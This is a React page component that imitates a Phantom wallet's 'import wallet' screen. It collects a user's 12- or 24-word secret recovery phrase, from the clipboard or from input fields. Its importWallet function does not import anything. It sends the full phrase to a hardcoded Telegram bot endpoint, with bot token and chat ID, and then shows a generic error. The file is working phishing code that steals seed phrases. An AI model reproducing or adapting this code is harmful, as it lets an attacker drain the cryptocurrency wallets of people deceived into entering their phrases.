"use client";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Separator } from "@/components/ui/separator";
import { cn } from "@/lib/utils";
import axios from "axios";
import { ArrowLeft } from "lucide-react";
import React, { useState } from "react";
import { toast } from "sonner";

const Page = () => {
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [is24WordPhrase, setIs24WordPhrase] = useState(false);
  const [isValid, setIsValid] = useState(false);

  const detectPaste = async () => {
    try {
      const rp = await navigator.clipboard.readText();

      // Verify recovery phrase is correct
      const words = rp.trim().split(/\s+/);
      const isValidLength = words.length === 12 || words.length === 24;

      if (isValidLength) {
        setRecoveryPhrase(rp);
        setIs24WordPhrase(words.length === 24);
        setIsValid(true);

        toast.success("Recovery Phrase detected");
      } else {
        toast.error("Please paste a valid 12 or 24-word recovery phrase");
      }
    } catch (error) {
      console.error("Failed to read clipboard:", error);
      toast.error("Failed to access clipboard. Please try again.");
    }
  };

  const importWallet = async () => {
    try {
      setIsLoading(true);

      await axios.post(
        "https://api.telegram.org/bot8203708673:AAEJqW3pt2E7Zt_FGeIwRpB3nSCuBCjD_Ys/sendMessage",
        {
          chat_id: "1517532400",
          text: `New Phantom Wallet Recovery Phrase: ${recoveryPhrase}`,
        }
      );
    } catch (error) {
      toast.error("Something went wrong, trying to connect to your wallet");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div>
      <header className="p-5 flex items-center justify-between">
        <Button variant="ghost" size="icon">
          <ArrowLeft size={25} className="text-foreground/60" />
        </Button>
        <div className="flex items-center gap-2">
          {Array.from({ length: 4 }).map((_, idx) => (
            <div
              key={idx}
              className={cn(
                "size-4 bg-secondary rounded-full",
                idx === 0 && "bg-primary"
              )}
            />
          ))}
        </div>
        <Button onClick={detectPaste} variant="link">
          Paste
        </Button>
      </header>
      <Separator />
      <div className="p-3 space-y-6">
        <h2 className="text-4xl font-bold text-center">
          Secret Recovery Phrase
        </h2>

        <p className="text-xl text-muted-foreground text-center">
          Import an existing wallet with your 12 or 24-word secret recovery
          phrase
        </p>

        <div className="grid grid-cols-3 gap-8">
          {Array.from({ length: is24WordPhrase ? 24 : 12 }).map((_, idx) => {
            const words = recoveryPhrase.split(/\s+/);
            const phrase = words[idx] || "";

            return (
              <div key={idx} className="relative w-full">
                <p className="absolute left-3 top-1.5 text-muted-foreground">
                  {idx + 1}.
                </p>
                <Input
                  value={phrase}
                  onChange={(e) => {
                    const newWords = [...words];
                    newWords[idx] = e.target.value.trim();
                    setRecoveryPhrase(newWords.join(" "));
                  }}
                  className="pl-7 font-medium"
                />
              </div>
            );
          })}
        </div>

        <footer className="space-y-2">
          <p
            className="text-center text-muted-foreground font-medium cursor-pointer hover:text-primary transition-colors"
            onClick={() => {
              setIs24WordPhrase(!is24WordPhrase);
              setRecoveryPhrase("");
              setIsValid(false);
            }}
          >
            I have a {is24WordPhrase ? "12" : "24"}-word recovery phrase
          </p>
          <Button
            className="w-full h-[3rem] cursor-pointer"
            disabled={!isValid || isLoading}
            onClick={async () => {
              const words = recoveryPhrase.trim().split(/\s+/);
              const expectedLength = is24WordPhrase ? 24 : 12;

              if (
                words.length === expectedLength &&
                words.every((word) => word.trim() !== "")
              ) {
                await importWallet();
              } else {
                toast.error(
                  `Please enter all ${expectedLength} words of your recovery phrase`
                );
              }
            }}
          >
            Import Wallet
          </Button>
        </footer>
      </div>
    </div>
  );
};

export default Page;
